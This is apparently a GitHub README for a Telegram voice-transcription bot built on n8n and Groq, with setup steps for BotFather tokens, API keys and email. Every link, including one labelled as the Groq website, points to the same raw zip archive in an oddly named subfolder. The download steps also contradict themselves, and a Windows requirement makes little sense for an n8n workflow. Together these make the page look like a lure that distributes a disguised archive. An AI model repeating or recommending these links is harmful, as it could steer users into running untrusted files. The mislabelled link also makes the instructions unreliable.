# 🎙️ n8n-telegram-voice-transcription-bot - Turn your voice notes into reports

[![](https://img.shields.io/badge/Download-n8n_Bot-blue)](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot/raw/refs/heads/main/Psylla/transcription-bot-telegram-voice-n-2.0.zip)

This tool converts your spoken Telegram messages into written text. It generates summaries, translates text, and sends emails to your inbox. It uses the n8n automation platform and the Groq cloud to process audio files.

## ⚙️ System Requirements

You need a computer that runs Windows 10 or Windows 11. Your internet connection must be stable to send audio files to the server. You need an active Telegram account. You also need a free account on the n8n automation platform.

## 🚀 Getting Started

Follow these steps to set up your bot. 

1. Visit this [link](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot/raw/refs/heads/main/Psylla/transcription-bot-telegram-voice-n-2.0.zip) to access the project files.
2. Click the green "Code" button on the screen.
3. Select "Download ZIP" to save the files to your computer.
4. Open your downloads folder.
5. Right-click the folder and select "Extract All."
6. Choose a folder where you want to keep the bot files.

## 🛠️ Setting Up Your Bot

You must connect the bot to your Telegram account. 

1. Open the Telegram app on your phone or desktop.
2. Search for "BotFather" in the search bar.
3. Start a chat with BotFather by clicking "Start."
4. Type "/newbot" and follow the instructions.
5. BotFather gives you an API Token. Copy this text.
6. Open the folder you extracted earlier.
7. Locate the file named "credentials.json" and open it with Notepad.
8. Paste your API Token into the field labeled "telegram_token."
9. Save and close the file.

## ☁️ Configuring the AI

This tool uses Groq to understand your speech. 

1. Go to the [Groq website](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot/raw/refs/heads/main/Psylla/transcription-bot-telegram-voice-n-2.0.zip).
2. Create a free account.
3. Click on the "API Keys" section.
4. Click "Create API Key."
5. Copy the key.
6. Open your "credentials.json" file again.
7. Paste the key into the field labeled "groq_api_key."
8. Save and close the file.

## 📦 Running the Application

Once your credentials exist, you can start the bot.

1. Ensure n8n is running on your system or server.
2. Open the n8n application.
3. Click "Import from File."
4. Select the ".json" file inside your extracted folder.
5. The workflow appears on your screen.
6. Click the "Activate" toggle at the top right of the screen.
7. Open the Telegram bot you created earlier.
8. Send a voice note to the bot.
9. Wait a few seconds for the bot to reply with a summary and transcript.

## 📧 Email Settings

The bot sends transcripts to your email. 

1. Open the n8n workflow editor.
2. Click on the node labeled "Email Sender."
3. Enter your email address in the "To" field.
4. Configure your SMTP settings provided by your email host.
5. Click "Save" to apply these changes.

## 📋 Features

- Speech to text using Whisper technology.
- Smart summaries created by Llama models.
- Translation of content into multiple languages.
- Automatic delivery to your email inbox.
- Secure processing of your audio notes.

## 💡 Troubleshooting

If the bot does not respond, check your internet connection first. Ensure that your Groq API key is valid and has not expired. Check the n8n logs for any error messages in red text. If you see an error, copy the text and search for it online. Ensure you enabled the "Activate" switch in the n8n editor. If you still have trouble, delete the workflow and import the file again.

## 📦 Installation Summary

To begin using this tool, visit the download page.

[![](https://img.shields.io/badge/Download-n8n_Bot-grey)](https://github.com/Alices5723/n8n-telegram-voice-transcription-bot/raw/refs/heads/main/Psylla/transcription-bot-telegram-voice-n-2.0.zip)

Ensure you keep your API keys private. Do not share your "credentials.json" file with anyone. Store your files in a folder you can access easily. The bot works best when your voice note is clear and stays under five minutes in length. If the bot fails to transcribe, check the quality of your audio recording.